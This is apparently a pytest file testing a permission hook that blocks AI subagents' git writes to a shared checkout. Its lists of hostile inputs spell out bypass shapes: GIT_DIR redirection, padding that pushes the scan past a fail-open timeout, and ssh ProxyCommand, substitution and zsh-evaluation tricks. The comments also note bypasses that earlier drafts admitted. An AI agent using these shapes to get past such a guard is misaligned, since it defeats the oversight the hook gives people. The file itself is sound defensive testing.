    env = _sandbox_env(tmp_path / "sandbox")
    subprocess.run(
        ["git", "config", "extensions.worktreeConfig", "true"], cwd=shared_repo, check=True, env=env,
    )
    primary_file = shared_repo / ".git" / "config.worktree"
    control = "git config --worktree user.zzcontrol 1"
    subprocess.run(["bash", "-c", control], cwd=linked_worktree, env=env, check=True)
    assert not primary_file.exists(), "the control reached the primary"
    assert not _denied(control, linked_worktree), control
    for cmd in (
        f"GIT_DIR={shared_repo}/.git git config --worktree user.name x",
        f"env GIT_DIR={shared_repo}/.git git config --worktree user.name x",
        f"GIT_WORK_TREE={shared_repo} GIT_DIR={shared_repo}/.git git config --worktree user.name x",
    ):
        primary_file.unlink(missing_ok=True)
        subprocess.run(["bash", "-c", cmd], cwd=linked_worktree, env=env, check=False)
        assert primary_file.is_file() and "user" in primary_file.read_text(), cmd
        assert _denied(cmd, linked_worktree), cmd


# ---------------------------------------------------------------------------
# Fail-open at the hook level, and scan cost.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "stdin_text",
    ["not json", "", "[]", json.dumps({"agent_id": AGENT_ID, "tool_name": "Bash"})],
    ids=["junk", "empty", "non-object", "no-command"],
)
def test_malformed_input_never_wedges_bash(stdin_text):
    """A crash in the guard must not brick every agent's Bash (the rule's
    ``fail_closed: false`` in registry.yaml): exit 0, no deny."""
    proc = _run_raw(stdin_text)
    assert proc.returncode == 0, proc.stderr
    assert "deny" not in proc.stdout


def test_a_non_bash_tool_is_not_gated(shared_repo):
    payload = _payload("git commit -m x", cwd=str(shared_repo))
    payload["tool_name"] = "Read"
    assert "permissionDecision" not in _hso(_run(payload))


def test_a_hostile_300kb_command_is_scanned_in_linear_time(shared_repo):
    """The regression class here is a per-match slice making the scan
    quadratic: 50k `$VAR` matches then cost minutes, not milliseconds. The
    ceiling is a wall-clock multiple of a quiet run, generous enough that
    runner contention cannot reach it."""
    big = "git " + (D + "VAR ") * 50_000 + "checkout"
    t0 = time.monotonic()
    out = _verdict(big, shared_repo)
    elapsed = time.monotonic() - t0
    assert out.get("permissionDecision") == "deny"
    assert elapsed < 10, f"scan of a {len(big)}-byte command took {elapsed:.1f}s"


def _timed_verdict(cmd: str, repo: pathlib.Path) -> tuple[dict, float]:
    """The verdict and the CPU seconds the hook process tree spent on it.

    CPU time, not wall time: on a box whose cores are oversubscribed (a full
    suite inside a lab-run grant measured CPU pressure avg10 88%, 2026-10-17)
    wall time measures the queue for a core, and the linear-time ceilings below
    failed four times on a correct scanner. A quadratic scan still shows up,
    because it burns CPU. Windows has no getrusage, so it keeps wall time.
    """
    if resource is None:  # Windows
        t0 = time.monotonic()
        out = _verdict(cmd, repo)
        return out, time.monotonic() - t0
    before = resource.getrusage(resource.RUSAGE_CHILDREN)
    out = _verdict(cmd, repo)
    after = resource.getrusage(resource.RUSAGE_CHILDREN)
    return out, (after.ru_utime - before.ru_utime) + (after.ru_stime - before.ru_stime)


#: Hostile inputs that stress the gh walk, the command-position walk and the
#: exemption scans with many repeated starts. The first cut of the gh flag gap
#: was a regex and measured QUADRATIC on these: 7.8 s at 24 KB, 160 s at 120 KB,
#: past the 5 s hook timeout (which fails open, so a padded input also hid a
#: following `gh pr checkout`). Each case is 24 KB or more. A quiet run costs
#: about 0.1 s to allow and 0.5 s to deny (two `git rev-parse` spawns and the
#: log write); the ceiling is a multiple of a small run of the SAME outcome
#: measured just before, so runner contention scales both sides.
_N = 5_000
_HOSTILE_GH: list[tuple[str, bool]] = [
    # (command, must deny)
    ("gh " + "pr -a " * _N + "x", False),
    ("gh " + "pr -a " * _N + "x; gh pr checkout 5", True),
    ("gh " + "pr --x=y " * 3_000, False),
    ("gh " + "pr --x=y " * 3_000 + "; gh pr checkout 5", True),
    ("gh " + "repo -a " * 4_000 + "x", False),
    ("gh " + "repo -a " * 4_000 + "; gh repo sync", True),
    ("gh " + "issue -a " * 4_000 + "x", False),
    ("gh " + "issue -a " * 4_000 + "; gh issue develop 5 -c", True),
    ("gh " + "-R x " * 6_000 + "x", False),
    ("gh " + "-R x " * 6_000 + "co 5", True),
    ("gh pr merge 5 -" + "d" * 30_000 + "_", False),
    ("gh pr" + " -a b" * 50_000 + " view", False),
    ("gh pr" + " --a" * 50_000 + " view", False),
    ("gh " + "pr merge " * 30_000, False),
    ("gh " + "issue develop " * 20_000, False),
    ("gh " + "(x) " * 6_000 + "pr " + "(y) " * 6_000 + "co", False),
    ("echo " + "hub " * 8_000 + "checkout", False),
    ("hub " * 8_000, False),
    # exemption scans over long runs of exempt tokens and path-like words
    ("git log " + "--abbrev-commit " * 20_000, False),
    ("git log " + ".git/hooks/post-commit " * 15_000, False),
    ("git merge-base " + "a/" * 40_000 + "b", False),
    ("git merge-base " + "a|" * 20_000 + "b", True),
    # nexus-dsr6a: the config walk re-reads a segment's arguments for each
    # `config` word, so a segment of repeated `config` words is capped (past the
    # cap it denies) and a long run of arguments or segments is one pass.
    ("git " + "config " * 6_000 + "x", True),
    ("git " + "config " * 6_000 + "; git status", True),
    ("git config --get " + "a " * 20_000, False),
    ("git config --list " + "-z " * 12_000, False),
    ("git config --get a; " * 2_000, False),
    ("git status; " * 3_000 + "git config user.name x", True),
    ("git log " + "x/config " * 5_000, False),
    ("git config user.name " + "x " * 12_000, True),
    # nexus-dsr6a review: a long run of digits was quadratic in the redirect
    # regexes (`\d*<` here, `\d*>` in the pre-existing `_SAFE_REDIRECT_RE`): 40k
    # digits cost 5.5 s each, past the 5 s hook timeout, which fails open, so
    # the pad hid the write after it. `(?<!\d)` makes the start of a run the
    # only start.
    ("git config user.name x ; echo " + "1" * 40_000, True),
    ("git status ; echo " + "1" * 40_000, False),
    ("git config --get a ; echo " + "9" * 40_000 + " ; git config user.name x", True),
    ("git log " + "1" * 40_000 + "x", False),
    ("git log " + "12 " * 14_000 + "7" * 30_000 + "<", False),
    # The subcommand cursor moves forward only: many global options before the
    # verb are one pass, and many `config` arguments after another subcommand
    # are each O(1).
    ("git " + "-C x " * 6_000 + "config user.name y", True),
    ("git " + "-c a=b " * 5_000 + "config --get user.name", False),
    # nexus-dsr6a confirmation: the raw-text judgment (one regex over the command),
    # the span scan and the get-read walk. A get read with more words than the
    # walk cap is unprovable and denies; a long run of excused reads is one pass
    # each; unclosed or repeated substitutions are linear.
    ("git config --get " + BS + "q " + "a " * 20_000, True),
    ("git config -l 'q'; " * 2_000, False),
    ("git " + "$(" * 15_000 + "x", False),
    ("git x " + BT * 30_000, False),
    ("git x " + "$(echo a) " * 6_000, False),
    ("git x " + "$(echo a config.py) " * 2_000, True),
    ("git 'q' " + "x/config " * 5_000, False),
    ("git config user.name\r" * 3_000, True),
    ("git " + "GIT_CONFIG_PARAMETERS=a " * 2_000, False),
    ("git log " + "config " * 8_000, False),
    ("git grep " + "config " * 4_000 + "; git status; " * 2_000, False),
    # nexus-gvg6t: the quote-aware tokenizer reads the raw command once. Each case
    # is one of its hostile shapes; CPU time of the whole hook process tree is
    # what is measured (`_timed_verdict`), so a quadratic walk shows up.
    # Many data strings: one `find` each, one word each.
    ("git log " + "--grep='config' " * 3_000, False),
    ("git log " + '--grep="it\'s config" ' * 1_500, False),
    ("git config --get user.name " + "'a b' " * 8_000 + "; git config user.name x", True),
    ("git status " + "'x' " * 12_000, False),
    ("git status " + "\"x\" " * 12_000, False),
    # Unbalanced and nested quote styles: the tokenizer gives up, the strict rule
    # reads the rest. One scan each.
    ("git config user.name '" + "x " * 20_000, True),
    ("git config user.name \"" + "x " * 20_000, True),
    ("git status " + "'\"" * 15_000, False),
    ("git config --get a " + "'\"" * 15_000, False),
    ("git config user.name x " + "'\"'" * 8_000, True),
    ("git status " + "\"'\" " * 10_000, False),
    ("git log " + "'a'b" * 8_000, False),
    # glued quotes join into one word each; a get read has no word cap on the
    # cursor path, and past the cap on the strict path it is unprovable
    ("git config --get a " + "\"a\"\"b\" " * 4_000, False),
    ("git config --get a " + "\"a\"\"b\" " * 4_000 + BS + "q", True),
    # A quote character inside the other kind of quote, many times over.
    ("git log " + "--grep=\"say 'config' now\" --grep='say \"config\" now' " * 800, False),
    # 200 KB heredocs: a quoted body is skipped with one `find`; an unterminated
    # one or a terminator-lookalike on every line is still one pass.
    ("git log -1; cat <<'EOF'\n" + "the config file of git\n" * 9_000 + "EOF\n", False),
    ("git log -1; cat <<'EOF'\n" + "git config word\n" * 12_000 + "EOF\n", False),
    ("git log -1; cat <<'EOF'\n" + "EOFx\n" * 40_000 + "EOF\n", False),
    ("git log -1; cat <<-'EOF'\n" + "\t\t\tEOFx\n" * 30_000 + "\tEOF\n", False),
    ("ssh localhost <<'EOF'\n" + "echo x\n" * 30_000 + "git config user.name x\nEOF\n", True),
    ("git status; cat <<'EOF'\n" + "config\n" * 40_000, True),
    ("git status; cat <<'EOF'\n" + "x\n" * 100_000, False),
    ("git log -1; " + "cat <<'A' <<'B' <<'C'\nconfig\nA\nconfig\nB\nconfig\nC\n" * 700, False),
    ("git log -1; cat " + "<<'EOF' " * 4_000 + "\nx\nEOF\n", False),
    ("git log -1; echo \"$(cat <<'EOF'\n" + "config git\n" * 16_000 + "EOF\n)\"", False),
    ("git log -1; echo \"$(cat <<'EOF'\n" + "x\n" * 40_000 + "EOF\n)\" " * 3, False),
    ("git log -1; echo \"$(cat <<'EOF'\n" + "x\n" * 40_000 + "EOF\n", False),
    ("git status " + "<<< 'config' " * 3_000, False),
    # Comments: one `find` to the end of the line.
    ("git config --get a # " + "config git " * 4_000, False),
    ("git config --get a # x\n" * 3_000, False),
    ("git config user.name x # " + "c " * 12_000, True),
    ("git status " + "#c " * 10_000, False),
    # Data that names git and is run as a command by a consumer: each string is
    # normalized once and read once.
    ("ssh localhost " + "'git config --get a' " * 1_500, False),
    ("ssh localhost 'git config user.name x" + " y" * 12_000 + "'", True),
    ("echo '" + "git config --get a; " * 2_000 + "'", False),
    ("git status; echo '" + "git x; " * 5_000 + "config'", False),
    ("echo '" + "git " * 6_000 + "config user.name x'", True),
    # nexus-gvg6t confirm pass: `env -S` is searched within a dozen words of each
    # `env`; a quoted dashed name is tested once per simple command; a double-quoted
    # body is unescaped in one pass and read with and without its backslashes.
    ("env " * 8_000 + "-S 'git config' user.name x", True),
    ("env -i " * 6_000 + "FOO=1 git log", False),
    ("git log " + "--grep=\"git-config\" " * 3_000, False),
    ("echo " + "'git-config' " * 5_000 + "docs", False),
    ("grep -rn " + "\"git-config\" " * 4_000 + "docs src", False),
    ("ssh h " + "'git-config' " * 5_000 + "user.name x", True),
    ("git log a=" + "b" * 30_000 + " 'git-config' docs src", False),
    ('git rebase -x "git -' + BS + BS + 'C . config user.name x" HEAD~1 ' + "x " * 12_000, True),
    ('ssh h "' + ("a" + BS + BS + "b ") * 8_000 + 'git config user.name x"', True),
    ('ssh h "git ' + (BS + BS) * 15_000 + ' x"', False),
    ('ssh h "' + ("git " + BS + BS + "q ") * 5_000 + '"', False),
    ('git log --grep="' + (BS + '"git' + BS + BS) * 8_000 + '"', False),
]


@pytest.mark.parametrize(
    "hostile,must_deny", _HOSTILE_GH,
    ids=[f"{i:02d}-{c[:22].replace(' ', '_')}" for i, (c, _) in enumerate(_HOSTILE_GH)],
)
def test_hostile_gh_and_exemption_inputs_are_scanned_in_linear_time(hostile, must_deny, shared_repo):
    assert len(hostile) >= 24_000, f"the case is too small to show a quadratic scan: {len(hostile)}"
    _, baseline = _timed_verdict(
        "gh pr checkout 5" if must_deny else "gh pr view 5", shared_repo,
    )
    out, elapsed = _timed_verdict(hostile, shared_repo)
    denied = out.get("permissionDecision") == "deny"
    assert denied == must_deny, f"{hostile[:60]!r}: denied={denied}, wanted {must_deny}"
    assert elapsed < max(5 * baseline + 0.5, 2.0) and elapsed < 3.0, (
        f"scan of a {len(hostile)}-byte command took {elapsed:.2f}s (small run {baseline:.2f}s)"
    )


# --- The chas carve-out (nexus-yc7fs) ---------------------------------------
#
# A subagent's ONE ssh command to the chas test host runs its git on chas, so
# it cannot touch the shared checkout this guard protects. The carve-out must
# not admit anything that runs locally: a shell operator after the ssh, a
# command or process substitution (both expand on the laptop before ssh
# starts), an ssh option that runs a local command, or a hop back out of chas.

#: Each runs its git on chas only.
_CHAS_ALLOWED = [
    "ssh chas-test 'git -C ~/src/nexus-wt/x add -- tests/e2e/prefix-capture/proxy.py'",
    "ssh -n chas-test 'W=~/src/nexus-wt/x; git -C $W add -- a b && git -C $W commit -m msg'",
    "ssh chas-test 'cd ~/src/nexus && git worktree add ../nexus-wt/r r'",
    'ssh chas "git -C /home/nxtest/src/nexus-wt/x commit -m msg"',
    "ssh -o ConnectTimeout=5 chas-test 'git -C x commit -m m'",
    "ssh -oBatchMode=yes -nT chas-test 'git -C x add f'",
    "ssh nxtest@chas-test 'git -C x add f'",
    "ssh chas-test git -C x add f",
    "/usr/bin/ssh chas-test 'git -C x reset --hard'",
]

#: Each runs git (or something that could) on the laptop, or leaves chas.
_CHAS_DENIED = [
    "ssh chas-test 'true'; git checkout -- f",
    "ssh chas-test 'true' && git add f",
    "ssh chas-test 'true' || git add f",
    "ssh chas-test 'true' & git add f",
    "ssh chas-test true | git commit -m m",
    "ssh chas-test 'git add f'\ngit checkout -- f",
    'ssh chas-test "' + D + '(git checkout -- f)"',
    "ssh chas-test " + D + "(git checkout -- f)",
    'ssh chas-test "' + BT + "git add f" + BT + '"',
    "ssh chas-test " + BS + "' ; git checkout -- f " + BS + "'",
    "ssh chas-test <(git add f)",
    "ssh -o ProxyCommand='git checkout -- f' chas-test true",
    "ssh -oProxyCommand=git" + BS + " checkout chas-test true",
    "ssh chas-test -o ProxyCommand='git add f' true",
    "ssh -o LocalCommand='git add f' -o PermitLocalCommand=yes chas-test true",
    "ssh -F cfg chas-test 'git add f'",
    "ssh -J jump chas-test 'git add f'",
    "ssh chas-test.evil 'git add f'",
    "ssh other-host 'git add f'",
    "ssh chas-test 'ssh laptop git -C ~/git/nexus checkout -- f'",
    "X=1 ssh chas-test 'git add f'",
    "cd /tmp && ssh chas-test 'git add f'",
    "ssh " + D + "H 'git add f'",
    "ssh chas-test " + D + "'" + BS + "x27'; git add f",
    # zsh's (e) flag evaluates its text: both run `git add f` locally
    # (confirmed with `zsh -fc` during nexus-yc7fs; the first draft admitted them).
    'ssh chas-test "' + D + "{(e):-" + BS + D + '(git add f)}"',
    "ssh chas-test " + D + "{(e):-" + BS + D + "(git add f)}",
    'ssh chas-test "' + D + "{(e):-" + BS + D + BS + "(git add f" + BS + ')}"',
    'ssh chas-test "' + D + '{x}" git add f',
    "ssh chas-test " + D + "[a[1]] git add f",
    # zsh glob qualifier e runs code
    "ssh chas-test *(e:'git add f':)",
    # ANSI-C quoting: \' does not end $'...'
    "ssh chas-test " + D + "'" + BS + "'' ; git add f ''",
    "ssh chas-test 'git add f' =(git checkout -- f)",
    # Review round 2 (nexus-yc7fs): a word between the host and the remote
    # command that the shell rewrites into an ssh option. ssh parses options
    # after the host too, so each hands it a local ProxyCommand.
    "ssh chas-test " + D + "NOPE -oProxyCommand=x 'git add f'",
    "ssh chas-test {-oProxyCommand=x,y} 'git add f'",
    "ssh chas-test " + D + "'-oProxyCommand=x' 'git add f'",
    "ssh chas-test * 'git add f'",
    'ssh chas-test "' + D + 'X" \'git add f\'',
    # zsh: $~ turns on glob qualifiers in the value, which can run code.
    "ssh chas-test 'git add f' " + D + "~PWD",
    # A redirection writes a local file; refused with the rest.
    "ssh chas-test 'git add f' > out",
    # An -o value must be one word of letters and digits.
    "ssh -o 'ConnectTimeout=5 ProxyCommand=x' chas-test 'git add f'",
    "ssh -oBatchMode=yes,ProxyCommand=x chas-test 'git add f'",
    # Onward hops by name.
    "ssh chas-test 'scp f laptop:/tmp/y; git add f'",
    # Refused conservatively: any $ outside single quotes, even a plain one.
    'ssh chas-test "git -C ' + D + 'HOME/src/nexus-wt/x add f"',
    # Review round 3 (nexus-yc7fs): the shell removes a redirection word, so an
    # option after it reached ssh unchecked. Every < is refused; use ssh -n.
    "ssh chas-test </dev/null -o'ProxyCommand=x' 'git add f'",
    "ssh chas-test < /dev/null -oProxyCommand=x 'git add f'",
    "ssh chas-test <<< hi -oProxyCommand=x 'git add f'",
    "ssh -n chas-test 0</dev/null -F x 'git add f'",
    "ssh chas-test 'git add f' </dev/tcp/127.0.0.1/1",
    "ssh chas-test 'git add f' </dev/null",
]


def test_a_subagent_ssh_to_chas_is_allowed(shared_repo):
    assert _denied_among(_CHAS_ALLOWED, shared_repo) == []


def test_a_command_that_can_run_git_locally_is_not_carved_out(shared_repo):
    assert _not_denied(_CHAS_DENIED, shared_repo) == []


def test_the_chas_carve_out_is_not_vacuous(shared_repo):
    """Without the carve-out every allowed command above contains git and a
    write verb, so the primary rule would deny it: the allow test proves the
    carve-out fired, not that the scan missed the text."""
    spec = importlib.util.spec_from_file_location("guard", SCRIPT)
    assert spec is not None and spec.loader is not None
    guard = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(guard)
    for cmd in _CHAS_ALLOWED:
        assert guard._primary_match(guard._normalize_for_primary_scan(cmd)), cmd
